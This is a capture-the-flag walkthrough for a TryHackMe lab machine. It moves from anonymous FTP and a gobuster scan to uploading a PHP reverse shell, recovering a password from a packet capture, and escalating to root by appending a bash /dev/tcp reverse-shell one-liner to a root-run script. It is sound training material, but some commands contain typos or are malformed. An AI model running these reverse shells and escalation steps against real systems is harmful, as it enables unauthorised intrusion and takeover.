Looks like we have three ports open `21, 22, 80`.

We have `ftp` anonymous login allowed and we see there are two files and a directory with read/write/execute permission.

![FTP Login](images/ftp_login.png)

Get the `important.jpg` and `notice.txt` into our PC and check what it says.

```
ftp> get important.jpg
local: important.jpg remote: important.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
226 Transfer complete.
251631 bytes received in 0.30 secs (824.6558 kB/s)

ftp> get notice.txt
local: notice.txt remote: notice.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notice.txt (208 bytes).
226 Transfer complete.
208 bytes received in 0.00 secs (906.8080 kB/s)
```

Now that we have the file, check the content of `notice.txt` file.

> Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I don't know who it is, but Maya is looking pretty sus.

Hmm, interesting so this share is accessible from via website. Looks like we have a username `maya`.

I did a `gobuster` scan. CMD -> `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt`

```

Seems like the `files` folder is similar to the `FTP` anonymous login from the website and it has execute, write permission as well.

We can put the [php-reverse-shell.php][3] into this folder and execute it via website. Just change the `$ip` to your TryHackMe's IP and `$port` to `4444` or you can leave as it is. Once you make the change `put` this file into the server.

![SHELL FTP](images/shell_ftp.png)

Once done with this, start a `netcat` listener. CMD -> `nc -lvnp 4444`

Go to the website `http://<IP>/file/ftp` and click on the file you copied into the server. You will have a reverse connection established.

![Got Access](images/got_access.png)

First things first, let's make this shell a bit stable.

```
1. python3 -c 'import pty;pty.spwan("/bin/bash")'
2. Ctrl + Z
3. stty raw -echo; fg
```

![Shell Stable](images/shell_stable.png)

We got the `recipe.txt` in the root directory.

![Recipe](images/recipe.png)

There is a directory called `incidents`. Let's get the file `suspicious.pcapng` back into our system and check the content.

We can start a Python Server using `python3 -m http.server` and get the file into your PC by visiting `http://<IP>:8000`.

![Content of Incidents](images/incidents.png)

*Alternative method:*

- Client: `nc -lvnp 1234 > sus.pcapng`
- Server: `nc -lvnp <YOUR_IP> 1234 < suspicious.pcapng`

Once you have the file, open it with Wireshark.

Go to File > Export > Objects > HTTP

![Export Objects](images/export_objects.png)

A reverse shell was initiated on the port `4444`. So we can filter the packets using `tcp.port == 4444`.

Right-Click on a packet > Follow > TCP Streams.

![TCP Streams](images/tcp_stream.png)

Seems like we have a password.

![Lennie's Password](images/lennie_password.png)

We can get the `user_flag` from here.

![User Flag](images/user_flag.png)

### Privilege Escalation

There is folder called `scripts`. Let's check the content.

![Scripts Planner](images/scripts_planner.png)

This file is executing another file `/etc/print.sh`. Let's check the content.

![Cat Planner](images/cat_planer.png)

This file has `read-write-execute` permission. So we can add the bash one linear reverse shell. We will append it to the file -> `echo "bash -i >& /dev/tcp/<YOUR_IP>/1234 0>&1" >> /etc/print.sh`

![Bash Scripts](images/bash_script.png)

Start a listener -> `nc -lvnp 1234` and wait for a while, you will have a reverse connection.

![No Comment](images/no_connect.png)


*Alternative Method:*

You could just add a copy script instead of bash one linear. CMD -> `echo " cp /root/* /home/lennie; chmod 777 /home/lennie/* " >> /etc/print.sh`

Now, we have the root access. You know what to do next :stuck_out_tongue_winking_eye:
